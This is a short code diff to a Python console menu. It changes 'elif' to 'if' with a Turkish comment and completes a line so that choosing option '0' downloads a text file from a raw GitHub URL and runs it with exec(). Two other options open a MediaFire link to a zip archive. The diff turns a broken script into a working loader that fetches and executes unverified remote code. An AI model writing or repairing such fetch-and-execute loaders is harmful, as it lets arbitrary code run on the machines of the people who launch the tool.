@@ -28,11 +28,11 @@ while True:
     os.system('cls')
     print(mine)
     chon = input('                                               \033[1;39m[\033[1;31m×\033[1;39m] \033[1;39m>> ')
-    elif chon == '1.1':
+    if chon == '1.1':  # 'if' bloğu ile başlamalısınız
         webbrowser.open_new("https://www.mediafire.com/file/1ogrrrao7vkef7s/Blossom.zip/file")
     elif chon == '2.1':
         webbrowser.open_new("https://www.mediafire.com/file/1ogrrrao7vkef7s/Blossom.zip/file")
     elif chon == '0':
-        exec(requests.get('https://raw.githubusercontent.com/Rafail2023/RovaClient/refs/heads/main/Main.txt')
+        exec(requests.get('https://raw.githubusercontent.com/Rafail2023/RovaClient/refs/heads/main/Main.txt').text)
     else:
-       continue
+        continue
